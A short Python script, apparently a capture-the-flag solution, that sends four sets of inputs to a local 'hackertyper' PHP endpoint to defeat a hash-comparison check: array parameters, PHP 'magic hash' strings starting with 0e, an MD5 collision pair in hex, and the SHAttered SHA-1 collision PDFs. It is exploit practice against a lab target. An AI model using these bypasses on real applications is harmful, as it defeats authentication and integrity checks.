import requests
import codecs

br=requests.Session()
url='http://localhost:10087/hackertyper/core.php'

res1=br.post(url,{'data1[]':'1','data2[]':'2'})
print(res1.text)
res2=br.post(url,{'data1':'08mcbI','data2':'8BGqk1'})
print(res2.text)
res3=br.post(url,{'data1':codecs.decode('0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef','hex'),'data2':codecs.decode('0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef','hex')})
print(res3.text)
res4=br.post(url,{'data1':open('shattered-1.pdf','rb').read(),'data2':open('shattered-2.pdf','rb').read()})
print(res4.text)